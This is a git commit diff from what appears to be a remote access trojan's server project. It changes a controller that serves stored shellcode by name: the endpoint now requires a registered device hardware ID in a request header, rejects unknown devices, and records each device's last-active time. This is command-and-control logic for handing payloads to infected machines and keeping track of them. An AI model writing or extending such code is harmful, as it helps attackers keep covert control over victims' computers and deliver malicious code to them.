d7a1351da965bf415bb0c752bcb06dd54badf566
Brendan Caldwell <brendanshauncaldwell@gmail.com>
2024-07-23 13:41:36 -0700

    Creaded declaration for DeviceAuthentication function in RatDbContext

--- Rat-Server/Controllers/ShellCodeController.cs
+++ Rat-Server/Controllers/ShellCodeController.cs
@@ -22,8 +22,19 @@ namespace Rat_Server.Controllers
         }
 
         [HttpGet("GetShellCode/{Name}")]
-        public async Task<ActionResult> GetShellCode(string Name)
+        public async Task<ActionResult> GetShellCode([FromHeader] Guid Hwid, string Name)
         {
+            Device? device = await _context.Devices.SingleOrDefaultAsync(d => d.Hwid == Hwid);
+            if (device == null)
+            {
+                return Unauthorized();
+            }
+            else
+            {
+                device.LastActive = DateTime.Now;
+                await _context.SaveChangesAsync();
+            }
+
             ShellCode? shellCode = await _context.ShellCodes.SingleOrDefaultAsync(shellCode => shellCode.Name == Name);
             if (shellCode == null)
             {
